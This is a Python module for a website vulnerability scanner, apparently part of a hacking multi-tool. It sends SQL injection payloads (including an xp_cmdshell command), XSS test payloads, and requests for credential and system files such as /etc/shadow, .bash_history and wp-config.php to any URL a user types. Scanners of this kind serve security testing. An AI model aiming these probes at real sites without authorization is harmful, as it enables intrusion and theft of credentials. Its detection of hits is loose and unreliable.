import os
import sys
import time
import random
import requests
from colorama import Fore, Style
from datetime import datetime

# import from utils
from utils.utils import clear, get_current_time, username, color
from utils.titles import title_websitescannervulnerability

def websitescannervulnerability():
    clear()
    print(getattr(Fore, color) + title_websitescannervulnerability + Style.RESET_ALL)
    
    try:
        # Lista di user agent
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]
        
        # Scegli un user agent casuale
        user_agent = random.choice(user_agents)
        headers = {"User-Agent": user_agent}
        
        print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Selected User-Agent: {Fore.WHITE}{user_agent}{Style.RESET_ALL}")
        website_url = input(f"{getattr(Fore, color)}[{get_current_time()}] [?] Website Url > {Style.RESET_ALL}")
        
        # Controlla se l'utente vuole tornare al menu principale
        if website_url.upper() == 'B':
            clear()
            # Esegue nuovamente il file main.py
            script_dir = os.path.dirname(os.path.abspath(__file__))
            main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
            os.system(f'python "{main_path}"')
            sys.exit()
        
        print(f"{getattr(Fore, color)}[{get_current_time()}] [*] Looking for vulnerabilities...{Style.RESET_ALL}")
        
        # Aggiungi https:// se non presente
        if "https://" not in website_url and "http://" not in website_url:
            website_url = "https://" + website_url
        
        # Funzione per verificare percorsi interessanti
        def check_interesting_paths(url):
            paths = [
                "admin", "admin/", "admin/index.php", "admin/login.php", "admin/config.php",
                "backup", "backup/", "backup/db.sql", "backup/config.tar.gz", "backup/backup.sql",
                "private", "private/", "private/.env", "private/config.php", "private/secret.txt",
                "uploads", "uploads/", "uploads/file.txt", "uploads/image.jpg", "uploads/backup.zip",
                "api", "api/", "api/v1/", "api/v1/users", "api/v1/status",
                "logs", "logs/", "logs/error.log", "logs/access.log", "logs/debug.log",
                "cache", "cache/", "cache/temp/", "cache/session/", "cache/data/",
                "server-status", "server-status/", "server-status/index.html",
                "dashboard", "dashboard/", "dashboard/index.html", "dashboard/admin.php", "dashboard/settings.php"
            ]
            
            try:
                if not str(url).endswith("/"):
                    url += "/"
                found = False
                for path in paths:
                    try:
                        response = requests.get(url + path, timeout=10, headers=headers)
                        if response.status_code == 200:
                            found = True
                            print(f"{Fore.GREEN}[{get_current_time()}] [+] Vulnerability: {Fore.WHITE}Interesting Path{Fore.GREEN} Status: {Fore.WHITE}True{Fore.GREEN} Path Found: {Fore.WHITE}/{path}{Style.RESET_ALL}")
                    except:
                        continue
                if not found:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [-] Vulnerability: {Fore.WHITE}Interesting Path{getattr(Fore, color)} Status: {Fore.WHITE}False{Style.RESET_ALL}")
            except:
                print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Vulnerability: {Fore.WHITE}Interesting Path{getattr(Fore, color)} Status: {Fore.WHITE}Error during testing{Style.RESET_ALL}")
        
        # Funzione per verificare file sensibili
        def check_sensitive_files(url):
            files = [
                "etc/passwd", "etc/password", "etc/shadow", "etc/group", "etc/hosts", "etc/hostname",
                "var/log/auth.log", "var/log/syslog", "var/log/messages", "var/log/nginx/access.log",
                "root/.bash_history", "home/user/.bash_history", "www/html/wp-config.php", "proc/self/environ",
                "opt/lampp/phpmyadmin/config.inc.php", "boot/grub/menu.lst", "proc/net/tcp"
            ]
            
            try:
                if not str(url).endswith("/"):
                    url += "/"
                found = False
                for file in files:
                    try:
                        response = requests.get(url + file, timeout=10, headers=headers)
                        if response.status_code == 200:
                            found = True
                            print(f"{Fore.GREEN}[{get_current_time()}] [+] Vulnerability: {Fore.WHITE}Sensitive File{Fore.GREEN} Status: {Fore.WHITE}True{Fore.GREEN} File Found: {Fore.WHITE}/{file}{Style.RESET_ALL}")
                    except:
                        continue
                if not found:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [-] Vulnerability: {Fore.WHITE}Sensitive File{getattr(Fore, color)} Status: {Fore.WHITE}False{Style.RESET_ALL}")
            except:
                print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Vulnerability: {Fore.WHITE}Sensitive File{getattr(Fore, color)} Status: {Fore.WHITE}Error during testing{Style.RESET_ALL}")
        
        # Funzione per verificare vulnerabilità XSS
        def check_xss(url):
            payloads = [
                "<script>alert('XssFoundBySimoTools')</script>",
                "<img src=x onerror=alert('XssFoundBySimoTools')>",
                "<svg/onload=alert('XssFoundBySimoTools')>"
            ]
            indicators = ["<script>", "alert(", "onerror=", "<svg", "javascript:"]
            
            try:
                response_old = requests.get(url, timeout=10, headers=headers)
                if not str(url).endswith("/"):
                    url += "/"
                found = False
                for payload in payloads:
                    try:
                        response = requests.get(url + payload, timeout=10, headers=headers)
                        if response.status_code == 200 and response.text.lower() != response_old.text.lower():
                            for indicator in indicators:
                                if indicator.lower() in response.text.lower():
                                    found = True
                                    print(f"{Fore.GREEN}[{get_current_time()}] [+] Vulnerability: {Fore.WHITE}XSS{Fore.GREEN} Status: {Fore.WHITE}True{Fore.GREEN} Payload: {Fore.WHITE}{payload}{Fore.GREEN} Indicator: {Fore.WHITE}{indicator}{Style.RESET_ALL}")
                                    break
                    except:
                        continue
                if not found:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [-] Vulnerability: {Fore.WHITE}XSS{getattr(Fore, color)} Status: {Fore.WHITE}False{Style.RESET_ALL}")
            except:
                print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Vulnerability: {Fore.WHITE}XSS{getattr(Fore, color)} Status: {Fore.WHITE}Error during testing{Style.RESET_ALL}")
        
        # Funzione per verificare vulnerabilità SQL Injection
        def check_sql(url):
            payloads = [
                "'", '"', "''", "' OR '1'='1'", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --", "/1000",
                "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*", "' OR ''='", "admin'--", "admin' /*",
                "' OR 1=1#", "' OR '1'='1' (", "') OR ('1'='1", "'; EXEC xp_cmdshell('dir'); --", "' UNION SELECT NULL, NULL, NULL --", 
                "' OR 1=1 --", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR 1=1#", "' OR 1=1/*", 
                "' OR 'a'='a'#", "' OR 'a'='a'/*", "' OR ''=''", "' OR '1'='1'--", "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1/*", 
                "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*", "' OR 1=1#", "' OR 1=1--", 
                "' OR 1=1/*", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*"
            ]
            indicators = [
                "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
                "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-", 
                "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
                "You have an error in your SQL syntax", "Incorrect syntax near", 
                "SQL command not properly ended", "sql", "Sql", "Warning", "Error"
            ]
            
            try:
                response_old = requests.get(url, timeout=10, headers=headers)
                if not str(url).endswith("/"):
                    url += "/"
                found = False
                for payload in payloads:
                    try:
                        response = requests.get(url + payload, timeout=10, headers=headers)
                        if response.status_code == 200 and response.text.lower() != response_old.text.lower():
                            for indicator in indicators:
                                if indicator.lower() in response.text.lower():
                                    found = True
                                    print(f"{Fore.GREEN}[{get_current_time()}] [+] Vulnerability: {Fore.WHITE}SQL Injection{Fore.GREEN} Status: {Fore.WHITE}True{Fore.GREEN} Payload: {Fore.WHITE}{payload}{Fore.GREEN} Indicator: {Fore.WHITE}{indicator}{Style.RESET_ALL}")
                                    break
                    except:
                        continue
                if not found:
                    print(f"{getattr(Fore, color)}[{get_current_time()}] [-] Vulnerability: {Fore.WHITE}SQL Injection{getattr(Fore, color)} Status: {Fore.WHITE}False{Style.RESET_ALL}")
            except:
                print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Vulnerability: {Fore.WHITE}SQL Injection{getattr(Fore, color)} Status: {Fore.WHITE}Error during testing{Style.RESET_ALL}")
        
        # Esegui tutti i controlli
        check_sql(website_url)
        check_xss(website_url)
        check_interesting_paths(website_url)
        check_sensitive_files(website_url)
        
        print(f"\n{getattr(Fore, color)}[{get_current_time()}] [*] Scan completed.{Style.RESET_ALL}")
        print(f"\n{getattr(Fore, color)}[{get_current_time()}] [*] Press Enter to continue or type 'B' to return to menu...{Style.RESET_ALL}")
        user_input = input()
        
        if user_input.upper() == 'B':
            clear()
            # Esegue nuovamente il file main.py
            script_dir = os.path.dirname(os.path.abspath(__file__))
            main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
            os.system(f'python "{main_path}"')
            sys.exit()
        else:
            clear()
            # Esegue nuovamente il file main.py
            script_dir = os.path.dirname(os.path.abspath(__file__))
            main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
            os.system(f'python "{main_path}"')
            sys.exit()
                
    except Exception as e:
        print(f"{getattr(Fore, color)}[{get_current_time()}] [!] Error: {Fore.WHITE}{str(e)}{getattr(Fore, color)}{Style.RESET_ALL}")
        print(f"\n{getattr(Fore, color)}[{get_current_time()}] [*] Press Enter to continue or type 'B' to return to menu...{Style.RESET_ALL}")
        user_input = input()
        
        if user_input.upper() == 'B':
            clear()
            # Esegue nuovamente il file main.py
            script_dir = os.path.dirname(os.path.abspath(__file__))
            main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
            os.system(f'python "{main_path}"')
            sys.exit()
        else:
            clear()
            # Esegue nuovamente il file main.py
            script_dir = os.path.dirname(os.path.abspath(__file__))
            main_path = os.path.join(os.path.dirname(script_dir), 'main.py')
            os.system(f'python "{main_path}"')
            sys.exit()